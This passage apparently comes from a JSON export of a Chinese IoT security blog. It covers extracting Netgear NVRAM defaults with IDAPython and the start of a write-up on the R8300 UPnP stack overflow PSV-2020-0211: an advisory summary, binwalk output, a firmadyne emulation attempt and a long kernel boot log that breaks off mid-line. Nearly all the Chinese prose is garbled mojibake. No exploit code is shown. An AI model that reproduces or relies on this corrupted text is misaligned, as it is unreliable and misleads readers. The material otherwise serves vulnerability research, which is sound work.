ä½¿ç”¨Dword(addr)è·å–â€œå­˜æ”¾å­—ç¬¦ä¸²åœ°å€â€ï¼Œä½¿ç”¨GetString()è¿™ä¸ªAPIå‡½æ•°ä»è¯¥åç§»æå–å­—ç¬¦ä¸² ç²˜è´´éƒ¨åˆ†ç»“æœï¼Œæœ‰å¤§é‡çš„é‡å¤ï¼Œè¿˜æœ‰è®¸å¤šé”®å€¼ä¸å­˜åœ¨ï¼Œå‡è®¾ä¸æˆç«‹ã€‚ 12345678910111213141516171819(&apos;acosNvramConfig_match&apos;, &apos;0xa3d4L&apos;)XrefsTo nvram-match func addr: 0xc940Lnvram key: qos_bw_set_selnvram value: 1XrefsTo nvram-match func addr: 0xc9b4Lnvram key: qos_bw_enablenvram value: 1XrefsTo nvram-match func addr: 0xfbd0Lnvram key: wlg_bandnvram value: 2.4GXrefsTo nvram-match func addr: 0xfc84Lnvram value: 5GXrefsTo nvram-match func addr: 0xff70Lnvram key: wlg_bandnvram value: 2.4Gnvram value: staticXrefsTo nvram-match func addr: 0x13d2cLnvram key: board_idnvram value: U12H127T00_NETGEAR NVRAMé»˜è®¤é…ç½®å¦‚ä¸Šæ‰€è¿°ï¼Œlibnvram.soä¸­dataæ®µå­˜æ”¾ç€é»˜è®¤é…ç½®åˆ©ç”¨IDApythonè·å–è¯¥åŒºåŸŸå­˜æ”¾çš„é”®å€¼ï¼Œæ³¨æ„ï¼šè¯¥åŒºåŸŸå¹¶ä¸å­˜æ”¾å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯å­˜æ”¾â€œå­˜æ”¾å­—ç¬¦ä¸²åœ°å€å¤„â€çš„åœ°å€ï¼Œæ‰€ä»¥ä¹Ÿè¦é€šè¿‡Dowordæ¥è·å–å®é™…åœ°å€ 1234567891011121314import idautilsfor seg in idautils.Segments(): if SegName(seg) == &apos;.data&apos;: start = idc.SegStart(seg) end = idc.SegEnd(seg) print idc.SegName(seg),start,end while(start!=end): key = GetString(Dword(start)) if key != None and key != &apos;0&apos;: start += 4 val = GetString(Dword(start)) if &apos;upnp&apos; in key: print(&apos;%s=%s&apos;%(key,val)) start += 4 è¿™é‡Œæˆ‘ä»¬åªå…³æ³¨æœ‰upnpç‰¹å¾çš„é”®å€¼å¯¹ 12345678.data [77868 94004](tel:7786894004)upnp_enable=1upnp_turn_on=1upnp_advert_period=30upnp_advert_ttl=4upnp_portmap_entry=0upnp_duration=3600upnp_DHCPServerConfigurable=1 å¦å¤–å†è¡¥å……å‡ ä¸ªä¸ç½‘ç»œæœ‰å…³çš„é…ç½® 123friendly_name=Netgearlan_hwaddr=AA:BB:CC:DD:EE:FFlan_ipaddr=192.168.2.2 ä½¿ç”¨è¿™ä¸ªé…ç½®æˆåŠŸä»¿çœŸ~ ä¸€äº›IDApythonä½¿ç”¨æ–¹æ³•è’¸ç±³å†™çš„ï¼šhttps://wooyun.js.org/drops/IDAPython%20%E8%AE%A9%E4%BD%A0%E7%9A%84%E7%94%9F%E6%B4%BB%E6%9B%B4%E6%BB%8B%E6%B6%A6%20part1%20and%20part2.htmlhttps://cartermgj.github.io/2017/10/10/ida-python/https://gitee.com/it-ebooks/it-ebooks-2018-04to07/raw/master/IDAPython%20%E5%88%9D%E5%AD%A6%E8%80%85%E6%8C%87%E5%8D%97.pdfhttps://www.0xaa55.com/thread-1586-1-1.htmlhttps://wizardforcel.gitbooks.io/grey-hat-python/content/43.html","categories":[{"name":"IOT","slug":"IOT","permalink":"https://cool-y.github.io/categories/IOT/"}],"tags":[{"name":"UPnP","slug":"UPnP","permalink":"https://cool-y.github.io/tags/UPnP/"},{"name":"å›ºä»¶æ¨¡æ‹Ÿ","slug":"å›ºä»¶æ¨¡æ‹Ÿ","permalink":"https://cool-y.github.io/tags/å›ºä»¶æ¨¡æ‹Ÿ/"},{"name":"Netgear","slug":"Netgear","permalink":"https://cool-y.github.io/tags/Netgear/"},{"name":"NVRAM","slug":"NVRAM","permalink":"https://cool-y.github.io/tags/NVRAM/"}]},{"title":"Netgear_æ ˆæº¢å‡ºæ¼æ´_PSV-2020-0211","slug":"Netgear-psv-2020-0211","date":"2021-01-08T05:26:26.000Z","updated":"2021-04-10T13:44:13.142Z","comments":true,"path":"2021/01/08/Netgear-psv-2020-0211/","link":"","permalink":"https://cool-y.github.io/2021/01/08/Netgear-psv-2020-0211/","excerpt":"","text":"å›ºä»¶æ¨¡æ‹Ÿä¸UPnPæ ˆæº¢å‡ºåˆ©ç”¨https://kb.netgear.com/000062158/Security-Advisory-for-Pre-Authentication-Command-Injection-on-R8300-PSV-2020-0211 https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/https://paper.seebug.org/1311/#1https://www.anquanke.com/post/id/217606 0x00 æ¼æ´æ¦‚è¦ æ¼æ´ç¼–å·ï¼š PSV-2020-0211 æŠ«éœ²æ—¶é—´ï¼š 2020 -07-31 â€” Netgear å®˜æ–¹å‘å¸ƒå®‰å…¨å…¬å‘Š 2020-08-18 â€“ æ¼æ´å…¬å¼€æŠ«éœ² å½±å“å‚å•†ï¼š Netgear æ¼æ´ç±»å‹ï¼š æ ˆæº¢å‡ºæ¼æ´ æ¼æ´è¯„åˆ†ï¼ˆCVSSï¼‰ï¼š 9.6, (AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) åˆ©ç”¨æ¡ä»¶ï¼š è¯¥æ¼æ´åªéœ€æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®è¢«æ”»å‡»è·¯ç”±å™¨çš„UPnPæœåŠ¡ï¼Œæ— éœ€èº«ä»½éªŒè¯ã€‚ æ¼æ´æˆå› ï¼š è¯¥æ¼æ´ä½äºè·¯ç”±å™¨çš„ UPnP æœåŠ¡ä¸­ï¼Œ ç”±äºè§£æ SSDP åè®®æ•°æ®åŒ…çš„ä»£ç å­˜åœ¨ç¼ºé™·ï¼Œå¯¼è‡´æœªç»æˆæƒçš„è¿œç¨‹æ”»å‡»è€…å¯ä»¥å‘é€ç‰¹åˆ¶çš„æ•°æ®åŒ…ä½¿å¾—æ ˆä¸Šçš„ buffer æº¢å‡ºï¼Œè¿›ä¸€æ­¥æ§åˆ¶ PC æ‰§è¡Œä»»æ„ä»£ç ã€‚ 0x01 å¨èƒèŒƒå›´ å½±å“èŒƒå›´ï¼š R8300 running firmware versions prior to 1.0.2.134 ZoomEyeæŸ¥è¯¢ç»“æœï¼š Netgear R8300å…±æœ‰579å°è®¾å¤‡æš´éœ²åœ¨äº’è”ç½‘ä¸Šï¼Œç»å¤§éƒ¨åˆ†åˆ†å¸ƒåœ¨ç¾å›½ï¼Œå°‘é‡è®¾å¤‡å‡ºç°åœ¨æ¬§æ´² â€” 0x02 Qemuæ¨¡æ‹Ÿ çœŸæœºè°ƒè¯• ç¡¬ä»¶è°ƒè¯•æ¥å£ uart å†å²RCE NETGEAR å¤šæ¬¾è®¾å¤‡åŸºäºå †æ ˆçš„ç¼“å†²åŒºæº¢å‡ºè¿œç¨‹æ‰§è¡Œä»£ç æ¼æ´ è®¾å¤‡åé—¨å¼€å¯telnet Unlocking the Netgear Telnet Console å›ºä»¶ç¯¡æ”¹æ¤å…¥telnet å›ºä»¶æ¨¡æ‹Ÿ QEMU ç°æœ‰å¹³å°ä¸Šæ¨¡æ‹Ÿ ARMã€MIPSã€X86ã€PowerPCã€SPARK ç­‰å¤šç§æ¶æ„ã€‚ æ ‘è“æ´¾ã€å¼€å‘æ¿ åªè¦ CPU æŒ‡ä»¤é›†å¯¹çš„ä¸Šï¼Œå°±å¯ä»¥è·‘èµ·æ¥ firmadyne åŸºäºqemuå®šåˆ¶ Qemu STM32 Avatar æ··åˆå¼ä»¿çœŸ åµŒå…¥å¼è®¾å¤‡å›ºä»¶å®‰å…¨åˆ†ææŠ€æœ¯ç ”ç©¶ç»¼è¿° http://cjc.ict.ac.cn/online/bfpub/yyc-2020818141436.pdf ç”±äºæ²¡æœ‰çœŸæœºï¼Œæˆ‘ä»¬é‡‡ç”¨äº†å›ºä»¶æ¨¡æ‹Ÿçš„æ–¹å¼æ¥æ­å»ºåˆ†æç¯å¢ƒã€‚é¦–å…ˆä¸‹è½½æœ‰é—®é¢˜çš„å›ºä»¶ R8300 Firmware Version 1.0.2.130 http://www.downloads.netgear.com/files/GDC/R8300/R8300-V1.0.2.130_1.0.99.zipä½¿ç”¨binwalkå¯¹å›ºä»¶ä¸­çš„ç‰¹å¾å­—ç¬¦ä¸²è¿›è¡Œè¯†åˆ«ï¼Œå¯ä»¥çœ‹åˆ°R8300é‡‡ç”¨äº†squashfsæ–‡ä»¶ç³»ç»Ÿæ ¼å¼ 1234567$ binwalk R8300-V1.0.2.130_1.0.99.chkDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------58 0x3A TRX firmware header, little endian, image size: 32653312 bytes, CRC32: 0x5CEAB739, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x21AB50, rootfs offset: 0x086 0x56 LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5470272 bytes2206602 0x21AB8A Squashfs filesystem, little endian, version 4.0, compression:xz, size: 30443160 bytes, 1650 inodes, blocksize: 131072 bytes, created: 2018-12-13 04:36:38 ä½¿ç”¨ binwalk -Me æå–å‡º Squashfs æ–‡ä»¶ç³»ç»Ÿï¼Œå¯ä»¥çœ‹åˆ°R8300ä¸ºARM v5æ¶æ„. 12$ file usr/sbin/upnpdusr/sbin/upnpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked (uses shared libs), stripped firmadyneç›´æ¥ä½¿ç”¨firmadyneæ¨¡æ‹ŸR8300å›ºä»¶å¤±è´¥ï¼Œä¸€æ˜¯ç½‘ç»œæ¥å£åˆå§‹åŒ–å¤±è´¥ï¼ŒäºŒæ˜¯NVRAMé…ç½®å­˜åœ¨é—®é¢˜åŸå› å¯èƒ½æ˜¯ï¼š firmadyneåªæ”¯æŒarmelã€mipsebã€ mipselè¿™ä¸‰ç§ç³»ç»Ÿå†…æ ¸ï¼Œç›¸æ¯”æˆ‘ä»¬ç†Ÿæ‚‰çš„armelï¼Œarmhfä»£è¡¨äº†å¦ä¸€ç§ä¸å…¼å®¹çš„äºŒè¿›åˆ¶æ ‡å‡†ã€‚https://people.debian.org/~aurel32/qemu/armhf/ NVRAMåº“åŠ«æŒå¤±è´¥ï¼Œfirmadyneå®ç°äº†sem_get()ã€sem_lock()ã€sem_unlock()ç­‰å‡½æ•°https://github.com/firmadyne/libnvram 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278$ ./fat.py &apos;Path to R8300 firmware file&apos; __ _ / _| | | | |_ __ _ | |_ | _| / _` | | __| | | | (_| | | |_ |_| \\__,_| \\__| Welcome to the Firmware Analysis Toolkit - v0.3 Offensive IoT Exploitation Training http://bit.do/offensiveiotexploitation By Attify - https://attify.com | @attifyme[+] Firmware: R8300-V1.0.2.130_1.0.99.chk[+] Extracting the firmware...[+] Image ID: 1[+] Identifying architecture...[+] Architecture: armel[+] Building QEMU disk image...[+] Setting up the network connection, please standby...[+] Network interfaces: [][+] All set! Press ENTER to run the firmware...[+] When running, press Ctrl + A X to terminate qemu**[+] Command line: /home/yjy/firmware-analysis-toolkit/firmadyne/scratch/2/run.sh**[sudo] password for yjy:Starting firmware emulation... use Ctrl-a + x to exit[ 0.000000] Booting Linux on physical CPU 0x0[ 0.000000] Linux version 4.1.17+ (vagrant@vagrant-ubuntu-trusty-64) (gcc version 5.3.0 (GCC) ) #1 Thu Feb 18 01:05:21 UTC 2016[ 0.000000] CPU: ARMv7 Processor [412fc0f1] revision 1 (ARMv7), cr=10c5387d[ 0.000000] CPU: PIPT / VIPT nonaliasing data cache, PIPT instruction cache[ 0.000000] Machine model: linux,dummy-virt[ 0.000000] debug: ignoring loglevel setting.[ 0.000000] Memory policy: Data cache writeback[ 0.000000] On node 0 totalpages: 65536[ 0.000000] free_area_init_node: node 0, pgdat c061dfe8, node_mem_map cfdf9000[ 0.000000] Normal zone: 512 pages used for memmap[ 0.000000] Normal zone: 0 pages reserved[ 0.000000] Normal zone: 65536 pages, LIFO batch:15[ 0.000000] CPU: All CPU(s) started in SVC mode.[ 0.000000] pcpu-alloc: s0 r0 d32768 u32768 alloc=1*32768[ 0.000000] pcpu-alloc: [0] 0[ 0.000000] Built 1 zonelists in Zone order, mobility grouping on. Total pages: 65024[ 0.000000] Kernel command line: root=/dev/vda1 console=ttyS0 nandsim.parts=64,64,64,64,64,64,64,64,64,64 rdinit=/firmadyne/preInit.sh rw debug ignore_loglevel print-fatal-signals=1 user_debug=31 firmadyne.syscall=0[ 0.000000] PID hash table entries: 1024 (order: 0, 4096 bytes)[ 0.000000] Dentry cache hash table entries: 32768 (order: 5, 131072 bytes)[ 0.000000] Inode-cache hash table entries: 16384 (order: 4, 65536 bytes)[ 0.000000] Memory: 253344K/262144K available (4297K kernel code, 170K rwdata, 1584K rodata, 180K init, 148K bss, 8800K reserved, 0K cma-reserved)[ 0.000000] Virtual kernel memory layout:[ 0.000000] vector : 0xffff0000 - 0xffff1000 ( 4 kB)[ 0.000000] fixmap : 0xffc00000 - 0xfff00000 (3072 kB)[ 0.000000] vmalloc : 0xd0800000 - 0xff000000 ( 744 MB)[ 0.000000] lowmem : 0xc0000000 - 0xd0000000 ( 256 MB)[ 0.000000] modules : 0xbf000000 - 0xc0000000 ( 16 MB)[ 0.000000] .text : 0xc0008000 - 0xc05c67bc (5882 kB)[ 0.000000] .init : 0xc05c7000 - 0xc05f4000 ( 180 kB)[ 0.000000] .data : 0xc05f4000 - 0xc061e840 ( 171 kB)[ 0.000000] .bss : 0xc0621000 - 0xc06462d4 ( 149 kB)[ 0.000000] NR_IRQS:16 nr_irqs:16 16[ 0.000000] Architected cp15 timer(s) running at 62.50MHz (virt).[ 0.000000] clocksource arch_sys_counter: mask: 0xffffffffffffff max_cycles: 0x1cd42e208c, max_idle_ns: 881590405314 ns[ 0.000071] sched_clock: 56 bits at 62MHz, resolution 16ns, wraps every 4398046511096ns[ 0.000128] Switching to timer-based delay loop, resolution 16ns[ 0.001495] Console: colour dummy device 80x30[ 0.001639] Calibrating delay loop (skipped), value calculated using timer frequency.. 125.00 BogoMIPS (lpj=625000)[ 0.001695] pid_max: default: 32768 minimum: 301[ 0.002124] Mount-cache hash table entries: 1024 (order: 0, 4096 bytes)[ 0.002142] Mountpoint-cache hash table entries: 1024 (order: 0, 4096 bytes)[ 0.005250] CPU: Testing write buffer coherency: ok[ 0.008040] Setting up static identity map for 0x40008240 - 0x40008298[ 0.015663] VFP support v0.3: implementor 41 architecture 4 part 30 variant f rev 0[ 0.019946] clocksource jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604462750000 ns[ 0.025312] NET: Registered protocol family 16[ 0.026714] DMA: preallocated 256 KiB pool for atomic coherent allocations[ 0.028535] cpuidle: using governor ladder[ 0.028604] cpuidle: using governor menu[ 0.030202] genirq: Setting trigger mode 1 for irq 20 failed (gic_set_type+0x0/0x48)[ 0.031001] genirq: Setting trigger mode 1 for irq 21 failed (gic_set_type+0x0/0x48)[ 0.031154] genirq: Setting trigger mode 1 for irq 22 failed (gic_set_type+0x0/0x48)[ 0.031310] genirq: Setting trigger mode 1 for irq 23 failed (gic_set_type+0x0/0x48)[ 0.031466] genirq: Setting trigger mode 1 for irq 24 failed (gic_set_type+0x0/0x48)[ 0.031614] genirq: Setting trigger mode 1 for irq 25 failed (gic_set_type+0x0/0x48)[ 0.031756] genirq: Setting trigger mode 1 for irq 26 failed (gic_set_type+0x0/0x48)[ 0.031900] genirq: Setting trigger mode 1 for irq 27 failed (gic_set_type+0x0/0x48)[ 0.032378] genirq: Setting trigger mode 1 for irq 28 failed (gic_set_type+0x0/0x48)[ 0.032530] genirq: Setting trigger mode 1 for irq 29 failed (gic_set_type+0x0/0x48)[ 0.032670] genirq: Setting trigger mode 1 for irq 30 failed (gic_set_type+0x0/0x48)[ 0.032819] genirq: Setting trigger mode 1 for irq 31 failed (gic_set_type+0x0/0x48)[ 0.032959] genirq: Setting trigger mode 1 for irq 32 failed (gic_set_type+0x0/0x48)[ 0.033118] genirq: Setting trigger mode 1 for irq 33 failed (gic_set_type+0x0/0x48)[ 0.033256] genirq: Setting trigger mode 1 for irq 34 failed (gic_set_type+0x0/0x48)[ 0.033394] genirq: Setting trigger mode 1 for irq 35 failed (gic_set_type+0x0/0x48)[ 0.033536] genirq: Setting trigger mode 1 for irq 36 failed (gic_set_type+0x0/0x48)[ 0.033681] genirq: Setting trigger mode 1 for irq 37 failed (gic_set_type+0x0/0x48)[ 0.033849] genirq: Setting trigger mode 1 for irq 38 failed (gic_set_type+0x0/0x48)[ 0.034017] genirq: Setting trigger mode 1 for irq 39 failed (gic_set_type+0x0/0x48)[ 0.034163] genirq: Setting trigger mode 1 for irq 40 failed (gic_set_type+0x0/0x48)[ 0.034311] genirq: Setting trigger mode 1 for irq 41 failed (gic_set_type+0x0/0x48)[ 0.034462] genirq: Setting trigger mode 1 for irq 42 failed (gic_set_type+0x0/0x48)[ 0.034612] genirq: Setting trigger mode 1 for irq 43 failed (gic_set_type+0x0/0x48)[ 0.034766] genirq: Setting trigger mode 1 for irq 44 failed (gic_set_type+0x0/0x48)[ 0.034921] genirq: Setting trigger mode 1 for irq 45 failed (gic_set_type+0x0/0x48)[ 0.035088] genirq: Setting trigger mode 1 for irq 46 failed (gic_set_type+0x0/0x48)[ 0.035258] genirq: Setting trigger mode 1 for irq 47 failed (gic_set_type+0x0/0x48)[ 0.035408] genirq: Setting trigger mode 1 for irq 48 failed (gic_set_type+0x0/0x48)[ 0.035554] genirq: Setting trigger mode 1 for irq 49 failed (gic_set_type+0x0/0x48)[ 0.035698] genirq: Setting trigger mode 1 for irq 50 failed (gic_set_type+0x0/0x48)[ 0.035841] genirq: Setting trigger mode 1 for irq 51 failed (gic_set_type+0x0/0x48)[ 0.036126] genirq: Setting trigger mode 1 for irq 52 failed (gic_set_type+0x0/0x48)[ 0.037808] Serial: AMBA PL011 UART driver[ 0.038739] 9000000.pl011: ttyS0 at MMIO 0x9000000 (irq = 52, base_baud = 0) is a PL011 rev1[ 0.093732] console [ttyS0] enabled[ 0.106203] vgaarb: loaded[ 0.108624] SCSI subsystem initialized[ 0.111674] usbcore: registered new interface driver usbfs[ 0.115340] usbcore: registered new interface driver hub[ 0.118879] usbcore: registered new device driver usb[ 0.126521] cfg80211: Calling CRDA to update world regulatory domain[ 0.133497] Switched to clocksource arch_sys_counter[ 0.147183] NET: Registered protocol family 2[ 0.152842] TCP established hash table entries: 2048 (order: 1, 8192 bytes)[ 0.158337] TCP bind hash table entries: 2048 (order: 1, 8192 bytes)[ 0.162885] TCP: Hash tables configured (established 2048 bind 2048)[ 0.167385] UDP hash table entries: 256 (order: 0, 4096 bytes)[ 0.171595] UDP-Lite hash table entries: 256 (order: 0, 4096 bytes)[ 0.176698] NET: Registered protocol family 1[ 0.179833] PCI: CLS 0 bytes, default 64[ 0.185928] NetWinder Floating Point Emulator V0.97 (extended precision)[ 0.192393] futex hash table entries: 256 (order: -1, 3072 bytes)[ 0.201353] squashfs: version 4.0 (2009/01/31) Phillip Lougher[ 0.207858] jffs2: version 2.2. (NAND) Â© 2001-2006 Red Hat, Inc.[ 0.212517] romfs: ROMFS MTD (C) 2007 Red Hat, Inc.[ 0.219896] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 253)[ 0.225512] io scheduler noop registered[ 0.228340] io scheduler cfq registered (default)[ 0.232063] firmadyne: devfs: 1, execute: 1, procfs: 1, syscall: 0[ 0.237165] ------------[ cut here ]------------[ 0.240536] WARNING: CPU: 0 PID: 1 at /home/vagrant/firmadyne-kernel/kernel-v4.1/fs/sysfs/dir.c:31 sysfs_warn_dup+0x50/0x6c()[ 0.248160] sysfs: cannot create duplicate filename &apos;/class/gpio&apos;[ 0.252258] Modules linked in:[ 0.254810] CPU: 0 PID: 1 Comm: swapper Not tainted 4.1.17+ #1[ 0.259118] Hardware name: Generic DT based system[ 0.262292] [&lt;c001c99c&gt;] (unwind_backtrace) from [&lt;c0019d30&gt;] (show_stack+0x10/0x14)[ 0.262401] [&lt;c0019d30&gt;] (show_stack) from [&lt;c0024ab4&gt;] (warn_slowpath_common+0x80/0xa8)[ 0.262472] [&lt;c0024ab4&gt;] (warn_slowpath_common) from [&lt;c0024b08&gt;] (warn_slowpath_fmt+0x2c/0x3c)[ 0.262560] [&lt;c0024b08&gt;] (warn_slowpath_fmt) from [&lt;c00e363c&gt;] (sysfs_warn_dup+0x50/0x6c)[ 0.262619] [&lt;c00e363c&gt;] (sysfs_warn_dup) from [&lt;c00e3714&gt;] (sysfs_create_dir_ns+0x74/0x84)[ 0.262679] [&lt;c00e3714&gt;] (sysfs_create_dir_ns) from [&lt;c018e6ac&gt;] (kobject_add_internal+0xb8/0x2ac)[ 0.262742] [&lt;c018e6ac&gt;] (kobject_add_internal) from [&lt;c018e9a8&gt;] (kset_register+0x1c/0x44)[ 0.262801] [&lt;c018e9a8&gt;] (kset_register) from [&lt;c02090b4&gt;] (__class_register+0xa8/0x198)[ 0.262860] [&lt;c02090b4&gt;] (__class_register) from [&lt;c02091e4&gt;] (__class_create+0x40/0x70)[ 0.262918] [&lt;c02091e4&gt;] (__class_create) from [&lt;c01adf68&gt;] (register_devfs_stubs+0x314/0xbb4)[ 0.262981] [&lt;c01adf68&gt;] (register_devfs_stubs) from [&lt;c05d9b08&gt;] (init_module+0x28/0xa4)[ 0.263053] [&lt;c05d9b08&gt;] (init_module) from [&lt;c0009670&gt;] (do_one_initcall+0x104/0x1b4)[ 0.263113] [&lt;c0009670&gt;] (do_one_initcall) from [&lt;c05c7d08&gt;] (kernel_init_freeable+0xf0/0x1b0)[ 0.263229] [&lt;c05c7d08&gt;] (kernel_init_freeable) from [&lt;c040f28c&gt;] (kernel_init+0x8/0xe4)[ 0.263287] [&lt;c040f28c&gt;] (kernel_init) from [&lt;c0016da8&gt;] (ret_from_fork+0x14/0x2c)[ 0.263383] ---[ end trace b31221f46a8dc90e ]---[ 0.263460] ------------[ cut here ]------------[ 0.263502] WARNING: CPU: 0 PID: 1 at /home/vagrant/firmadyne-kernel/kernel-v4.1/lib/kobject.c:240 kobject_add_internal+0x240/0x2ac()[ 0.263572] kobject_add_internal failed for gpio with -EEXIST, don&apos;t try to register things with the same name in the same directory.[ 0.263639] Modules linked in:[ 0.263699] CPU: 0 PID: 1 Comm: swapper Tainted: G W 4.1.17+ #1[ 0.263744] Hardware name: Generic DT based system[ 0.263788] [&lt;c001c99c&gt;] (unwind_backtrace) from [&lt;c0019d30&gt;] (show_stack+0x10/0x14)[ 0.263846] [&lt;c0019d30&gt;] (show_stack) from [&lt;c0024ab4&gt;] (warn_slowpath_common+0x80/0xa8)[ 0.263906] [&lt;c0024ab4&gt;] (warn_slowpath_common) from [&lt;c0024b08&gt;] (warn_slowpath_fmt+0x2c/0x3c)[ 0.263970] [&lt;c0024b08&gt;] (warn_slowpath_fmt) from [&lt;c018e834&gt;] (kobject_add_internal+0x240/0x2ac)[ 0.264032] [&lt;c018e834&gt;] (kobject_add_internal) from [&lt;c018e9a8&gt;] (kset_register+0x1c/0x44)[ 0.264091] [&lt;c018e9a8&gt;] (kset_register) from [&lt;c02090b4&gt;] (__class_register+0xa8/0x198)[ 0.268034] [&lt;c02090b4&gt;] (__class_register) from [&lt;c02091e4&gt;] (__class_create+0x40/0x70)[ 0.275667] [&lt;c02091e4&gt;] (__class_create) from [&lt;c01adf68&gt;] (register_devfs_stubs+0x314/0xbb4)[ 0.280619] [&lt;c01adf68&gt;] (register_devfs_stubs) from [&lt;c05d9b08&gt;] (init_module+0x28/0xa4)[ 0.285445] [&lt;c05d9b08&gt;] (init_module) from [&lt;c0009670&gt;] (do_one_initcall+0x104/0x1b4)[ 0.289737] [&lt;c0009670&gt;] (do_one_initcall) from [&lt;c05c7d08&gt;] (kernel_init_freeable+0xf0/0x1b0)[ 0.290664] [&lt;c05c7d08&gt;] (kernel_init_freeable) from [&lt;c040f28c&gt;] (kernel_init+0x8/0xe4)[ 0.290727] [&lt;c040f28c&gt;] (kernel_init) from [&lt;c0016da8&gt;] (ret_from_fork+0x14/0x2c)[ 0.290797] ---[ end trace b31221f46a8dc90f ]---[ 0.290872] firmadyne: Cannot create device class: gpio![ 0.291677] firmadyne: Cannot register character device: watchdog, 0xa, 0x82![ 0.291743] firmadyne: Cannot register character device: wdt, 0xfd, 0x0![ 0.345419] Non-volatile memory driver v1.3[ 0.360206] brd: module loaded[ 0.368143] loop: module loaded[ 0.375773] vda: vda1[ 0.380587] [nandsim] warning: read_byte: unexpected data output cycle, state is STATE_READY return 0x0[ 0.387584] [nandsim] warning: read_byte: unexpected data output cycle, state is STATE_READY return 0x0[ 0.394469] [nandsim] warning: read_byte: unexpected data output cycle, state is STATE_READY return 0x0[ 0.401256] [nandsim] warning: read_byte: unexpected data output cycle, state is STATE_READY return 0x0[ 0.402697] [nandsim] warning: read_byte: unexpected data output cycle, state is STATE_READY return 0x0[ 0.402848] [nandsim] warning: read_byte: unexpected data output cycle, state is STATE_READY return 0x0[ 0.403058] nand: device found, Manufacturer ID: 0x98, Chip ID: 0x39[ 0.403112] nand: Toshiba NAND 128MiB 1,8V 8-bit[ 0.403158] nand: 128 MiB, SLC, erase size: 16 KiB, page size: 512, OOB size: 16[ 0.403555] flash size: 128 MiB[ 0.403585] page size: 512 bytes[ 0.403612] OOB area size: 16 bytes[ 0.403640] sector size: 16 KiB[ 0.403665] pages number: 262144[ 0.403690] pages per sector: 32[ 0.403715] bus width: 8[ 0.405652] bits in sector size: 14[ 0.408186] bits in page size: 9[ 0.410586] bits in OOB size: 4[ 0.412941] flash size with OOB: 135168 KiB[ 0.416112] page address bytes: 4[ 0.418491] sector address bytes: 3[ 0.421054] options: 0x42[ 0.423632] Scanning device for bad blocks[ 0.497574] Creating 11 MTD partitions on &quot;NAND 128MiB 1,8V 8-bit&quot;:[ 0.504589] 0x000000000000-0x000000100000 : &quot;NAND simulator partition 0&quot;[ 0.510956] 0x000000100000-0x000000200000 : &quot;NAND simulator partition 1&quot;[ 0.517483] 0x000000200000-0x000000300000 : &quot;NAND simulator partition 2&quot;[ 0.523079] 0x000000300000-0x000000400000 : &quot;NAND simulator partition 3&quot;[ 0.528404] 0x000000400000-0x000000500000 : &quot;NAND simulator partition 4&quot;[ 0.533683] 0x000000500000-0x000000600000 : &quot;NAND simulator partition 5&quot;[ 0.538960] 0x000000600000-0x000000700000 : &quot;NAND simulator partition 6&quot;[ 0.544362] 0x000000700000-0x000000800000 : &quot;NAND simulator partition 7&quot;[ 0.549586] 0x000000800000-0x000000900000 : &quot;NAND simulator partition 8&quot;[ 0.554998] 0x000000900000-0x000000a00000 : &quot;NAND simulator partition 9&quot;[ 0.560167] 0x000000a00000-0x000008000000 : &quot;NAND simulator partition 10&quot;[ 0.568706] tun: Universal TUN/TAP device driver, 1.6[ 0.573024] tun: (C) 1999-2004 Max Krasnyansky &lt;maxk@qualcomm.com&gt;[ 0.584170] PPP generic driver version 2.4.2[ 0.587727] PPP BSD Compression module registered[ 0.591009] PPP Deflate Compression module registered[ 0.594922] PPP MPPE Compression module registered[ 0.598416] NET: Registered protocol family 24[ 0.601736] PPTP driver version 0.8.5[ 0.604905] usbcore: registered new interface driver usb-storage[ 0.610485] hidraw: raw HID events driver (C) Jiri Kosina[ 0.614655] usbcore: registered new interface driver usbhid[ 0.618555] usbhid: USB HID core driver[ 0.621686] Netfilter messages via NETLINK v0.30.[ 0.625702] nf_conntrack version 0.5.0 (3958 buckets, 15832 max)[ 0.630752] ctnetlink v0.93: registering with nfnetlink.[ 0.635472] ipip: IPv4 over IPv4 tunneling driver[ 0.639820] gre: GRE over IPv4 demultiplexor driver[ 0.643303] ip_gre: GRE over IPv4 tunneling driver[ 0.649259] ip_tables: (C) 2000-2006 Netfilter Core Team[ 0.655447] arp_tables: (C) 2002 David S. Miller[ 0.660480] Initializing XFRM netlink socket[ 0.664155] NET: Registered protocol family 10[ 0.670172] ip6_tables: (C) 2000-2006 Netfilter Core Team[ 0.674635] sit: IPv6 over IPv4 tunneling driver[ 0.680072] NET: Registered protocol family 17[ 0.683649] bridge: automatic filtering via arp/ip/ip6tables has been deprecated. Update your scripts to load br_netfilter if you need this.[ 0.692092] Bridge firewalling registered[ 0.694840] Ebtables v2.0 registered[ 0.697697] 8021q: 802.1Q VLAN Support v1.8[ 0.700677] Registering SWP/SWPB emulation handler[ 0.705032] hctosys: unable to open rtc device (rtc0)[ 0.713464] EXT4-fs (vda1): couldn&apos;t mount as ext3 due to feature incompatibilities[ 0.721943] EXT4-fs (vda1): mounting ext2 file system using the ext4 subsystem[ 0.732941] EXT4-fs (vda1): warning: mounting unchecked fs, running e2fsck is recommended[ 0.740503] EXT4-fs (vda1): mounted filesystem without journal. Opts: (null)[ 0.745898] VFS: Mounted root (ext2 filesystem) on device 254:1.[ 0.752726] Freeing unused kernel memory: 180K (c05c7000 - c05f4000)[ 0.790000] random: init urandom read with 3 bits of entropy availablenvram_get_buf: time_zonesem_lock: Triggering NVRAM initialization!nvram_init: Initializing NVRAM...sem_get: Key: 